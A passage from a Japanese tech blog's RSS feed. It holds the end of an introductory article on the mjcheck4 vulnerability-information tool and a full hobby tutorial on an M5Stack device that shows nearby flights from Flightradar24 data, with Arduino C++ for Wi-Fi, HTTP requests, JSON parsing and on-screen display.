UbuntuやRedHatなどのLinuxサーバの脆弱性を確認するのは難しい</li></ul></li></ul></li><li>バージョン比較はできない<ul><li>mjcheck4のUIでは、対象製品のバージョンまでは登録できない<ul><li>例えば、<code>cpe:/a:oracle:java_se</code>のような記載となり、java SEのバージョンまでは記載しない</li></ul></li><li>特定バージョンのみ影響を受けるような脆弱性の場合、バージョンを考慮していないので手動で影響対象かを判別する必要がある</li></ul></li></ul></li></ul><p>まだ脆弱性情報収集と対策を本格的に実施していない組織においては、以下のステップを踏んだ方がよさそうです。</p><ul><li>まずはmjcheck4でを使う<ul><li>mjcheck4 で、主要なクライアント&#x2F;サーバ&#x2F;ネットワーク機器 などを登録して、現状を把握する<ul><li>登録するために、現状を確認するというアクションが行える</li></ul></li></ul></li><li>一部に於いて、脆弱性対応を始めてみる<ul><li>前述の対応フローを参考に、脆弱性情報を読みながら、できるところから対応をしてみる</li><li>一部ずつ始め、できる範囲を増やし、対応に関する知見を得る</li></ul></li><li>商用製品の脆弱性管理ツールを検討する<ul><li>商用製品であれば、mjcheck4で不足していると感じる部分が提供されていることが多いので、乗り換える<ul><li>対応のタスク管理機能、バージョンによる脆弱性の有無判断、対応優先度決め、多数の環境への対応、等</li></ul></li></ul></li></ul><h1 id="まとめ"><a href="#まとめ" class="headerlink" title="まとめ"></a>まとめ</h1><p>mjcheck4は、比較的簡易にセキュリティ情報収集を始められることが確認できました。</p><p>脆弱性情報を収集した後の「脆弱性対応」をするには少し物足りないものですが、「まずはやってみる」という点では良いのではないかと思います。</p><p>こういうツールでまずはセキュリティ情報収集&#x2F;脆弱性対応の必要性を感じつつ、大規模且つ重要なシステムは <a href="https://vuls.biz/">FutureVuls</a> などの脆弱性管理サービスを使うのが良いかと思います。</p><p>もし、脆弱性対応についてお困りのことがあれば、井上までご相談ください。<br>製品ありきではなく、何らかの知見を共有できるかもしれません。</p><p>以上です。</p><p>次は市川さんの<a href="/articles/20230420a/">Cloud Data Fusionで始めるETL入門</a>です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Security/">Security</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%85%A5%E9%96%80/">入門</category>
      
      <category domain="https://future-architect.github.io/tags/%E5%88%9D%E5%BF%83%E8%80%85%E5%90%91%E3%81%91/">初心者向け</category>
      
      <category domain="https://future-architect.github.io/tags/%E8%84%86%E5%BC%B1%E6%80%A7/">脆弱性</category>
      
      <category domain="https://future-architect.github.io/tags/JVN/">JVN</category>
      
      <category domain="https://future-architect.github.io/tags/mjcheck4/">mjcheck4</category>
      
      
      <comments>https://future-architect.github.io/articles/20230419a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>お家で電子工作入門 ～上空のフライト情報を可視化する🛫～</title>
      <link>https://future-architect.github.io/articles/20230418a/</link>
      <guid>https://future-architect.github.io/articles/20230418a/</guid>
      <pubDate>Mon, 17 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;img src=&quot;/images/20230418a/j413_6_2_(1).png&quot; alt=&quot;&quot; width=&quot;500&quot; height=&quot;281&quot; loading=&quot;lazy&quot;&gt;

&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot;</description>
          
        
      
      
      
      <content:encoded><![CDATA[<img src="/images/20230418a/j413_6_2_(1).png" alt="" width="500" height="281" loading="lazy"><h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>本記事は<a href="/articles/20230417a/">春の入門祭り</a>2日目の記事となります。<br>今日はM5Stackを使ったお家電子工作の沼へ誘いたいと思います。</p><p>過去にも電子工作連載があり、Futureでは活発にお家電子工作をやっております。</p><p><a href="https://future-architect.github.io/articles/20220404a/">https://future-architect.github.io/articles/20220404a/</a></p><h2 id="何を作るか考える"><a href="#何を作るか考える" class="headerlink" title="何を作るか考える"></a>何を作るか考える</h2><img src="/images/20230418a/427ad433-320a-a7a1-a967-4122190b4765.png" alt="" width="632" height="750" loading="lazy"><p>お家電子工作はワクワクが原動力なので、何かワクワクするものを作りたいなーと考えてみました。</p><p>うーんと考えてみたところ、この3年間コロナもあり海外に全然行ってないなーと。</p><p>海外に行くときのワクワクはまず空港に到着してフライト情報を眺めることから始まります。</p><p>じゃあ、<strong>自分の住んでいる周辺を飛ぶ飛行機の情報を表示</strong>することで、その飛行機に思いを馳せてワクワクするんじゃないかと考えました。</p><h2 id="必要なもの"><a href="#必要なもの" class="headerlink" title="必要なもの"></a>必要なもの</h2><ul><li><a href="https://www.switch-science.com/products/7362">M5Stack Basic</a></li><li>SDカード（16GB以下）</li><li>WiFi環境</li><li>VSCode</li></ul><h3 id="M5Stackはいいゾ"><a href="#M5Stackはいいゾ" class="headerlink" title="M5Stackはいいゾ"></a>M5Stackはいいゾ</h3><p>とりあえずお家で電子工作やIoTをやってみたい方はぜひ1台持っておくとよいです。ほぼ何でもできます。</p><ul><li>ESP32ベース<ul><li>簡単にWiFiが使えるのでIoTにもってこいです。<ul><li>処理も早いです。</li></ul></li></ul></li><li>ノーコードでもいける<ul><li>GUIで簡単に作ることもできます。</li><li><a href="https://flow.m5stack.com/">https://flow.m5stack.com/</a></li></ul></li><li>公式が凄い（語彙力）<ul><li>とりあえず、公式がM5Stack売り始めからめっちゃ頑張ってます。</li><li>めっちゃ拡張機能出してます。<ul><li><a href="https://www.switch-science.com/collections/m5stack">https://www.switch-science.com/collections/m5stack</a></li></ul></li><li>自動水やりとかできます。<ul><li><a href="https://www.switch-science.com/products/6913">https://www.switch-science.com/products/6913</a></li></ul></li></ul></li></ul><p>学生時代にM5Stack拡張して、赤外線サバゲー作ってたりもしました。</p><p><a href="https://www.youtube.com/watch?v=deW3GmdMe_M">https://www.youtube.com/watch?v=deW3GmdMe_M</a></p><h2 id="環境構築"><a href="#環境構築" class="headerlink" title="環境構築"></a>環境構築</h2><p>VSCodeは<a href="https://azure.microsoft.com/ja-jp/products/visual-studio-code">公式ページ</a>からインストールして下さい。<br>VSCodeの拡張機能であるPlatformIO IDEを使って開発を行います。<br>PlatformIO IDEの導入は<a href="https://zenn.dev/kotaproj/articles/esp32_vscode_pio">こちらの記事</a>を参考にして下さい。</p><h3 id="プロジェクトの作成"><a href="#プロジェクトの作成" class="headerlink" title="プロジェクトの作成"></a>プロジェクトの作成</h3><p>拡張機能のインストールが終わると、Welcome画面が出てきます。<br>「New Project」からプロジェクトを作成しましょう。</p><img src="/images/20230418a/b5e37c37-c91d-85c8-da5a-5bc95ed16254.png" alt="" width="1200" height="511" loading="lazy"><ul><li>Name: Future_Tech_Blog（なんでもよいです。）</li><li>Board: M5Stack Core ESP32</li><li>Framework: Arduino</li></ul><img src="/images/20230418a/1467bebc-58ea-f16d-6211-13c5d0fd8134.png" alt="" width="1200" height="869" loading="lazy"><p>以下のようなディレクトリ構成でプロジェクトが作成されます。</p><img src="/images/20230418a/c53220d7-0840-3663-c777-dae6b227a8d6.png" alt="" width="491" height="460" loading="lazy"><h3 id="ライブラリのインストール"><a href="#ライブラリのインストール" class="headerlink" title="ライブラリのインストール"></a>ライブラリのインストール</h3><p>今回は以下のライブラリを使用します。</p><ul><li>M5Stack.h<ul><li>M5Stackの各種機能を使うためのライブラリ</li></ul></li><li>WiFi.h<ul><li>WiFiに接続するためのライブラリ</li></ul></li><li>HTTPClient.h<ul><li>GETリクエストを送るためのライブラリ</li></ul></li><li>ArduinoJson.h<ul><li>JSONを扱うためのライブラリ</li></ul></li><li>time.h<ul><li>時刻を扱ったり、変換したりするためのライブラリ</li></ul></li></ul><p>PlatformIOでのライブラリインストールは以下の手順で行っていきます。</p><p>PlatformIO Home画面から「Libraries」を選択します。</p><img src="/images/20230418a/c217b591-431a-d565-6747-f4361dfd5f88.png" alt="" width="1200" height="938" loading="lazy"><p>M5Stack.hを例にライブラリを検索します。</p><img src="/images/20230418a/f61e15fa-deac-9968-eab7-0ed288999b39.png" alt="" width="1200" height="409" loading="lazy"><p>該当のライブラリをクリックします。</p><img src="/images/20230418a/e6ea510f-ad6f-d4df-bb3f-e0451de648cd.png" alt="" width="1175" height="330" loading="lazy"><p>「Add to Project」からプロジェクトへ追加します。<br><img src="/images/20230418a/cea2ae68-5753-78b3-49e1-0d13e4365174.png" alt="" width="1188" height="526" loading="lazy"></p><p>「Select a project」から作成したプロジェクトを選択し、「Add」を押すことで追加できます。</p><img src="/images/20230418a/0cb18834-4f55-7a54-c889-6a76e4ff5fc2.png" alt="" width="1200" height="748" loading="lazy"><p>これをあとArduinoJsonとTimeに対して行うことで準備完了です。<br>HTTPClientやWiFiに対しては不要です。</p><h2 id="Flightrader24を理解する"><a href="#Flightrader24を理解する" class="headerlink" title="Flightrader24を理解する"></a>Flightrader24を理解する</h2><img src="/images/20230418a/f53f1045-f749-5372-1bbc-f23471d484a9.png" alt="" width="1200" height="568" loading="lazy"><p><a href="https://www.flightradar24.com/51.5,-0.12/6">Flightrader24</a>は世界中のフライト情報を取得することができます。</p><p>iOSやAndroidのアプリもあり、触ったことがある人も居るのではないでしょうか？</p><p>Flightrader24ではREST APIも公開していて、以下のURLにGETリクエストするとJSONでデータを取得することができます。</p><p><code>http://data-live.flightradar24.com/zones/fcgi/feed.js?adsb=1&amp;mlat=1&amp;faa=1&amp;flarm=1&amp;estimated=1&amp;air=1&amp;gnd=1&amp;vehicles=1&amp;gliders=1&amp;array=1</code></p><p>各クエリパラメータの説明は以下に詳しく書いてあります。<br><a href="https://www.mk-mode.com/blog/2016/02/08/fr24-getting-flight-info/">JSON - Flightradar24 から飛行中の航空機情報を取得！</a></p><p>ここで<code>bounds=</code>というクエリパラメータを追加し、緯度（北）・緯度（南）・経度（西）・経度（東）の順で値を入れていくとフライト情報を取得するエリアを指定することができます。</p><p>今回は大崎がある品川区の端から端を指定してみます。</p><p>どうやって緯度・経度を取得するかって？それはChat-GPTにお任せです。</p><img src="/images/20230418a/4d540cca-b35a-ee19-1e69-b3138553e2df.png" alt="" width="958" height="612" loading="lazy"><p>こういう調べても出てきそうにない情報は初手Chat-GPTがおススメです。<br>緯度・経度が得られたのでクエリパラメータを指定したURLが以下になります。</p><p><code>http://data-live.flightradar24.com/zones/fcgi/feed.js?bounds=35.63,35.59,139.71,139.76&amp;adsb=1&amp;mlat=1&amp;faa=1&amp;flarm=1&amp;estimated=1&amp;air=1&amp;gnd=1&amp;vehicles=1&amp;gliders=1&amp;array=1</code></p><p>これでGETしてみたところ、取得できませんでした。<br>さすがに範囲が狭すぎたようなので小数点第二位を四捨五入して取得したところ、以下のようなフライト情報が取得できました。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;2fe70675&#x27;</span>, <span class="string">&#x27;4D23DB&#x27;</span>, 35.5631, 139.7589, 329, 0, 1, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;T-RJTT172&#x27;</span>, <span class="string">&#x27;GL7T&#x27;</span>, <span class="string">&#x27;9H-VIL&#x27;</span>, 1681552816, <span class="string">&#x27;XSP&#x27;</span>, <span class="string">&#x27;HND&#x27;</span>, <span class="string">&#x27;VJT735&#x27;</span>, 1, 0, <span class="string">&#x27;VJT735&#x27;</span>, 0]</span><br></pre></td></tr></table></figure><p>各項目の意味は先ほどのリンクを参考にしてください。<br><a href="https://www.mk-mode.com/blog/2016/02/08/fr24-getting-flight-info/">JSON - Flightradar24 から飛行中の航空機情報を取得！</a></p><p>とりあえず、10: 便名、11: 時刻、12: 出発空港, 13: 到着空港がわかれば楽しめそうです。</p><h2 id="M5Stack側のコードを作成"><a href="#M5Stack側のコードを作成" class="headerlink" title="M5Stack側のコードを作成"></a>M5Stack側のコードを作成</h2><p>M5Stackは<code>setup()</code>と<code>loop()</code>の2つの大きな関数による構造となっております。<br><code>setup()</code>は最初の1度しか呼ばれず、残りは<code>loop()</code>が名前の通り永遠に呼ばれるようになっています。</p><p>コード全体はこちらのGitHubに置いてあります。</p><p><a href="https://github.com/bigface0202/flightM5rader">https://github.com/bigface0202/flightM5rader</a></p><h3 id="setup側"><a href="#setup側" class="headerlink" title="setup側"></a>setup側</h3><p>setup側は起動後の1度しか呼ばれないため、主に接続を確立したり、画面の初期設定を行うなどの処理を記述します。</p><h4 id="M5Stackのディスプレイ設定"><a href="#M5Stackのディスプレイ設定" class="headerlink" title="M5Stackのディスプレイ設定"></a>M5Stackのディスプレイ設定</h4><p>M5Stackのディスプレイには文字や画像を表示することができます。<br>その初期設定を以下のように記述します。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// M5Stackの初期化</span></span><br><span class="line">M5.<span class="built_in">begin</span>();</span><br><span class="line"><span class="comment">// フォントサイズ</span></span><br><span class="line">M5.Lcd.<span class="built_in">setTextFont</span>(<span class="number">4</span>);</span><br><span class="line"><span class="comment">// フォントカラー</span></span><br><span class="line">M5.Lcd.<span class="built_in">setTextColor</span>(WHITE);</span><br><span class="line"><span class="comment">// 文字の初期位置</span></span><br><span class="line">M5.Lcd.<span class="built_in">setCursor</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="WiFiへ接続"><a href="#WiFiへ接続" class="headerlink" title="WiFiへ接続"></a>WiFiへ接続</h4><p>今回はHTTPリクエストを投げる必要があるため、WiFiへの接続は必須となります。<br><code>WIFI_SSID</code>と<code>WIFI_PASSWORD</code>を自宅のWiFiの情報に書き換えることで接続できるようになります。<br>また、5GHz帯は接続不可能なため2.4GHz帯のWiFiを選んで下さい。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WiFiに接続</span></span><br><span class="line">WiFi.<span class="built_in">begin</span>(WIFI_SSID, WIFI_PASSWORD);</span><br><span class="line"><span class="type">int</span> _cursorX = <span class="number">0</span>;</span><br><span class="line">M5.Lcd.<span class="built_in">print</span>(<span class="string">&quot;Connecting to Wi-Fi&quot;</span>);</span><br><span class="line"><span class="comment">// 接続を試みている状態を画面に表示</span></span><br><span class="line"><span class="keyword">while</span> (WiFi.<span class="built_in">status</span>() != WL_CONNECTED) &#123;</span><br><span class="line">    Serial.<span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    M5.Lcd.<span class="built_in">setCursor</span>(<span class="number">0</span> + <span class="number">5</span> * _cursorX, <span class="number">30</span>);</span><br><span class="line">    M5.Lcd.<span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">300</span>);</span><br><span class="line">    _cursorX++;</span><br><span class="line">    <span class="keyword">if</span> (_cursorX &gt; <span class="number">320</span>) &#123;</span><br><span class="line">      _cursorX = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="loop側"><a href="#loop側" class="headerlink" title="loop側"></a>loop側</h3><p>loop側は主に処理をさせたい内容を記述していきます。<br>今回の場合だと、フライト情報の取得とその情報の変換・表示になります。</p><h4 id="リクエストを投げる"><a href="#リクエストを投げる" class="headerlink" title="リクエストを投げる"></a>リクエストを投げる</h4><p>GETリクエストは以下のように投げることができます。<br>毎回、取得できるとは限らないので<code>HTTP_CODE_OK</code>以外の時はエラーコードを表示するにようにしています。<br>また、GETリクエストを送る際は<code>delay</code>を最後に挟むようにしてください。<br><code>delay</code>を入れないとマシンガンリクエストを送ることになり、APIサーバーに対して負荷をかけてしまうため大変よろしくないです。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTPClient http;</span><br><span class="line">String apiAddress = <span class="string">&quot;http://data-live.flightradar24.com/zones/fcgi/feed.js?bounds=35.6,35.5,139.7,139.8&amp;adsb=1&amp;mlat=1&amp;faa=1&amp;flarm=1&amp;estimated=1&amp;air=1&amp;gnd=1&amp;vehicles=1&amp;gliders=1&amp;array=1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String payload;</span><br><span class="line">    http.<span class="built_in">begin</span>(apiAddress);</span><br><span class="line">    <span class="type">int</span> httpCode = http.<span class="built_in">GET</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (httpCode &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (httpCode == HTTP_CODE_OK) &#123;</span><br><span class="line">            <span class="comment">// 以下、取得したデータの処理</span></span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        M5.Lcd.<span class="built_in">setCursor</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        M5.Lcd.<span class="built_in">print</span>(<span class="string">&quot;HTTP GET ERROR: &quot;</span>);</span><br><span class="line">        M5.Lcd.<span class="built_in">println</span>(httpCode);</span><br><span class="line">        <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// delayを入れ忘れるとマシンガンリクエストになるので、忘れずに</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取得したJSONの処理と表示"><a href="#取得したJSONの処理と表示" class="headerlink" title="取得したJSONの処理と表示"></a>取得したJSONの処理と表示</h4><p>Flightrader24にリクエストを送って取得した情報を表示していきます。<br>基本的に取得した配列に対して、ループで3秒ごとに表示していく処理になります。<br>1点だけ注意したいのが、リクエストを投げて得られる時刻がUNIX時間なので人間が読める時間に変換する必要があり、そちらの関数<code>unix2datetime</code>は後述します。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JSON取得用の変数</span></span><br><span class="line"><span class="function">DynamicJsonDocument <span class="title">doc</span><span class="params">(<span class="number">4096</span>)</span></span>;</span><br><span class="line"><span class="comment">// リクエストで取得した情報を格納</span></span><br><span class="line">payload = http.<span class="built_in">getString</span>();</span><br><span class="line"><span class="comment">// String -&gt; JSON</span></span><br><span class="line"><span class="built_in">deserializeJson</span>(doc, payload);</span><br><span class="line"><span class="comment">// 配列の大きさを取得</span></span><br><span class="line"><span class="type">int</span> len = doc[<span class="string">&quot;aircraft&quot;</span>].<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">// 配列の数だけフライト情報を表示</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    String flightName = doc[<span class="string">&quot;aircraft&quot;</span>][i][<span class="number">10</span>];</span><br><span class="line">    <span class="type">time_t</span> unixTimeUTC = doc[<span class="string">&quot;aircraft&quot;</span>][i][<span class="number">11</span>];</span><br><span class="line">    String departure = doc[<span class="string">&quot;aircraft&quot;</span>][i][<span class="number">12</span>];</span><br><span class="line">    String arrival = doc[<span class="string">&quot;aircraft&quot;</span>][i][<span class="number">13</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Unix timeから日本時間へ変換</span></span><br><span class="line">    String dateTimeString = <span class="built_in">unix2datetime</span>(unixTimeUTC);</span><br><span class="line">    <span class="comment">// 表示</span></span><br><span class="line">    M5.Lcd.<span class="built_in">setCursor</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    M5.Lcd.<span class="built_in">print</span>(<span class="string">&quot;Flight Name: &quot;</span>);</span><br><span class="line">    M5.Lcd.<span class="built_in">println</span>(flightName);</span><br><span class="line">    M5.Lcd.<span class="built_in">print</span>(<span class="string">&quot;Time: &quot;</span>);</span><br><span class="line">    M5.Lcd.<span class="built_in">println</span>(dateTimeString);</span><br><span class="line">    M5.Lcd.<span class="built_in">print</span>(<span class="string">&quot;Departure: &quot;</span>);</span><br><span class="line">    M5.Lcd.<span class="built_in">println</span>(departure);</span><br><span class="line">    M5.Lcd.<span class="built_in">print</span>(<span class="string">&quot;arrival: &quot;</span>);</span><br><span class="line">    M5.Lcd.<span class="built_in">println</span>(arrival);</span><br><span class="line">    <span class="comment">// 3秒待つ</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">3000</span>);</span><br><span class="line">    <span class="comment">// 画面初期化</span></span><br><span class="line">    M5.Lcd.<span class="built_in">fillScreen</span>(BLACK);</span><br></pre></td></tr></table></figure><h4 id="UNIX時間を変換する"><a href="#UNIX時間を変換する" class="headerlink" title="UNIX時間を変換する"></a>UNIX時間を変換する</h4><p>Chat-GPTマジ便利。<br>要所要所で詰まったらChat-GPT先生にお任せしたほうが早いです。</p><img src="/images/20230418a/637f864f-c784-1683-86fe-56959601377c.png" alt="" width="1032" height="1138" loading="lazy"><figure class="highlight cpp"><figcaption><span>unix2datetime</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String <span class="title">unix2datetime</span><span class="params">(<span class="type">time_t</span> unixTime)</span> </span>&#123;</span><br><span class="line">  <span class="type">time_t</span> unixTimeJTC = unixTime + <span class="number">32400</span>;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tm</span> *tmTime = <span class="built_in">localtime</span>(&amp;unixTimeJTC);</span><br><span class="line">  <span class="type">char</span> dateTimeString[<span class="number">20</span>];</span><br><span class="line">  <span class="built_in">strftime</span>(dateTimeString, <span class="built_in">sizeof</span>(dateTimeString), <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tmTime);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dateTimeString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="画像を表示する（おまけ）"><a href="#画像を表示する（おまけ）" class="headerlink" title="画像を表示する（おまけ）"></a>画像を表示する（おまけ）</h3><p>ここからは機能的にはあまり関係ないのでおまけになりますが、こうやって遊びを入れることで自分のプロダクトに愛着が沸きます。<br>現在の状態だと画面にフライト情報の文字だけが表示されて味気ないので、フライト情報のAPIをGETする際に飛行機の画像を表示します。</p><p>画像はこちらのフリー素材をサイズ変更（幅160px）してダウンロードし、SDカードにフォルダ（フォルダ名：img）を作成して取り込んで下さい。<br>取り込み終わったSDカードはM5Stackに挿しましょう。</p><p><a href="https://jitanda.com/2014/02/07/j413_6/">https://jitanda.com/2014/02/07/j413_6/</a></p><p>また、LavyanGFXをライブラリインストールの手順でやったようにインストールして下さい。</p><img src="/images/20230418a/0dabb105-0d88-ed15-a015-7e3aa6b39624.png" alt="" width="1200" height="231" loading="lazy"><p>コードでは画像を<code>sprite.pushRotateZoom()</code>で徐々に拡大させることで、近づいてきているようなエフェクトを作ってみます。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LGFX_AUTODETECT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;LovyanGFX.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;LGFX_AUTODETECT.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> LGFX lcd;</span><br><span class="line"><span class="function"><span class="type">static</span> LGFX_Sprite <span class="title">sprite</span><span class="params">(&amp;lcd)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 画像サイズが違うかもなので、ここはよしなに変えて下さい</span></span><br><span class="line"><span class="type">int</span> width = <span class="number">160</span>;</span><br><span class="line"><span class="type">int</span> height = <span class="number">120</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 初期化処理</span></span><br><span class="line">    lcd.<span class="built_in">init</span>();</span><br><span class="line">    lcd.<span class="built_in">clear</span>(TFT_BLACK);</span><br><span class="line">    SD.<span class="built_in">begin</span>(TFCARD_CS_PIN, SPI, <span class="number">20000000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 画像の読み込み</span></span><br><span class="line">    sprite.<span class="built_in">createSprite</span>(width, height);</span><br><span class="line">    sprite.<span class="built_in">drawPngFile</span>(SD, <span class="string">&quot;/img/airplane.png&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 画像を徐々にズーム</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i ++) &#123;</span><br><span class="line">        sprite.<span class="built_in">pushRotateZoom</span>(width, height, <span class="number">0</span>, i, i);</span><br><span class="line">        <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="できあがったもの"><a href="#できあがったもの" class="headerlink" title="できあがったもの"></a>できあがったもの</h2><img src="/images/20230418a/m5stack_airplane3.gif" alt="m5stack_airplane3.gif" width="284" height="274" loading="lazy"><h2 id="まとめ"><a href="#まとめ" class="headerlink" title="まとめ"></a>まとめ</h2><p>こうやってハードウェア込みで自分がワクワクするものを開発できるのがお家電子工作の良いところですね。GPSモジュールなんかもあるので、位置情報のあたりも自動化するなど色々工夫もできそうです。</p><p>ぜひ皆さんもLet’s enjoy お家電子工作してください。</p><p>明日は井上さんで<a href="/articles/20230419a/">初めてのセキュリティ情報収集（mjckeck4)</a>です。</p><p>アイキャッチは<a href="https://jitanda.com/">時短だ</a>の<a href="https://jitanda.com/2014/02/07/j413_6/">飛行機38</a>を使わせていただきました。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/IoT/">IoT</category>
      
      
      <category domain="https://future-architect.github.io/tags/IoT/">IoT</category>
      
      <category domain="https://future-architect.github.io/tags/%E9%9B%BB%E5%AD%90%E5%B7%A5%E4%BD%9C/">電子工作</category>
      
      <category domain="https://future-architect.github.io/tags/M5stack/">M5stack</category>
      
      <category domain="https://future-architect.github.io/tags/flightrader24/">flightrader24</category>
      
      
      <comments>https://future-architect.github.io/articles/20230418a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>markdownlintで設計書の品質を高める</title>
      <link>https://future-architect.github.io/articles/20230417b/</link>
      <guid>https://future-architect.github.io/articles/20230417b/</guid>
      <pubDate>Sun, 16 Apr 2023 15:00:01 GMT</pubDate>
      
        
        
          
          
      <description>&lt;img src=&quot;/images/20230417b/Microsoft.VisualStudio.Services.Icons.png&quot; alt=&quot;&quot; width=&quot;128&quot; height=&quot;128&quot;&gt;

&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot;</description>
          
        
      
      
      
